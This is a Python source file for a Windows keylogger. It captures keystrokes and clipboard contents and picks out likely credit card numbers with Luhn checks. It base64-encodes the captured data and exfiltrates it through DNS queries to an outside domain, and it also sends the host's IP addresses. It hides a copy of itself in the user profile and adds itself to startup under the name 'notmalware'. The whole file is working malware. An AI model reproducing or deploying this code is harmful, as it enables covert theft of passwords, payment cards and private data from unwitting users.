import os
import re
import threading
import base64
import win32clipboard
import ifaddr
import sys
import subprocess
import shutil
from distutils import dir_util


# Own files
import numchecks
import senddns
import persistence

from datetime import datetime
from pynput import keyboard

MAX_BUF_LEN = 30
CLOUDFLARE_DNS_ADDR = '1.1.1.1' 

logfilePath = 'log.txt'
buf = ''
numCount = 0

def encodeStr(str):
    return base64.b64encode(str.encode('ascii')).decode('ascii')

def sendDnsReq(payload):
    senddns.sendQuery(f'{payload}.qqq.wergm.uk', senddns.TYPE_A, CLOUDFLARE_DNS_ADDR)
    
def sendStr(s, date=True):
    send = (str(round(datetime.now().timestamp(), 3)) + ':' + s) if date else s
    encoded = encodeStr(send)
    sendDns = threading.Thread(target=sendDnsReq, args=(encoded,))
    sendDns.start()
    
def sendBuf(enterEnd=False):
    global buf, numCount
    s = buf + (r'\E' if enterEnd else '')
    buf = ''
    numCount = 0
    sendStr(s)
     
def writeBuf(key):
    global buf, numCount
    if hasattr(key, 'char'):
        if len(str(key)) == 3: 
            buf += key.char
            if (re.match(r'[0-9]', key.char)):
                numCount += 1
                if (numCount > 9):
                    valid = numchecks.luhnCheckAll(buf[-numCount:])
                    for s in valid: sendStr(s)
            else:
                numCount = 0
    elif key == keyboard.Key.space: buf += ' '
    elif key == keyboard.Key.backspace: buf = buf[:-1]
    
    if key == keyboard.Key.enter: sendBuf(enterEnd=True)
    elif len(buf) >= MAX_BUF_LEN: sendBuf()


# Terminate program, for testing
def exitProg():
    sys.exit(1)
    
def press(key):
    writeBuf(key)
    # Terminate program, for testing
    if (key == keyboard.Key.f12):
        return False

def getClipboard():
    win32clipboard.OpenClipboard()
    data = ''
    try:
        data = win32clipboard.GetClipboardData()
    except:
        pass
    finally:
        win32clipboard.CloseClipboard()
    return data
    
def getClip():
    clip = getClipboard()
    if clip != '':
        # Split clipboard into lines and each line into sections of at most 30 chars
        lines = clip.splitlines()
        for line in lines:
            line += r'\n'
            split = []
            for y in range(MAX_BUF_LEN, len(line) + MAX_BUF_LEN, MAX_BUF_LEN):
                split.append(line[y - MAX_BUF_LEN:y])

            for s in split:
                if s != r'\n': sendStr(s)
        
def onCopyPaste():
    threading.Timer(0.5, function=getClip).start()

def listenClipboard():
    with keyboard.GlobalHotKeys({
        '<ctrl>+c': onCopyPaste,
        '<ctrl>+v': onCopyPaste,
        '<f12>': exitProg,
    }) as hotkeys:
        hotkeys.join()
        
def keylog():
    threading.Thread(target=listenClipboard).start();
    with keyboard.Listener(on_press=press) as listener:
        listener.join()

def copySelf():
    try:
        if (os.getcwd() != os.environ['USERPROFILE'] + r'\keylogger'):
            cpPath = os.environ['USERPROFILE'] + r'\keylogger'
            dir_util.copy_tree(os.getcwd(), cpPath)
            subprocess.run(['attrib', '+H', cpPath], text=True, shell=True)  
            return 0
        else:
            return 1
    except Exception as e:
        return 1
        
    
os.environ['PYNPUT_BACKEND'] = 'win32'
if not copySelf():
    execPath = os.environ['USERPROFILE'] + r'\keylogger\keylogger.exe'
    persistence.addToStartupAdmin(execPath, 'notmalware')
# ip addresses
adapters = ifaddr.get_adapters()
for adapter in adapters:
    for ip in adapter.ips:
        sendStr(str(ip.ip) + '/' + str(ip.network_prefix), date=False)
keylog()